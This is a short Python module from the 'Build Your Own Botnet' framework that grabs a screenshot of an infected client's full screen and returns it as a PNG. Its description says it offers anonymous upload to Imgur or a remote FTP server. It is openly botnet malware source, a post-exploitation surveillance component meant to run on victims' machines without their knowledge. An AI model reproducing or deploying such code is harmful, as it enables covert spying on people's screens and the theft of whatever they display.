#!/usr/bin/python
# -*- coding: utf-8 -*-
'Screenshot (Build Your Own Botnet)'

# packages
import mss

# modules
import util

# globals
command = True
packages = ['mss','util']
platforms = ['win32','linux2','darwin']
usage = 'screenshot [imgur/ftp] [option=value, ...]'
description = """
Capture a screenshot on the client and optionally upload anonymously to 
Imgur or to a remote FTP server (default: save image on local host machine)
"""

# main
def run():
    """ 
    Capture a screenshot

    """
    try:
        with mss.mss() as screen:
            img = screen.grab(screen.monitors[0])
        return util.png(img)
    except Exception as e:
        util.log("{} error: {}".format(run.func_name, str(e)))
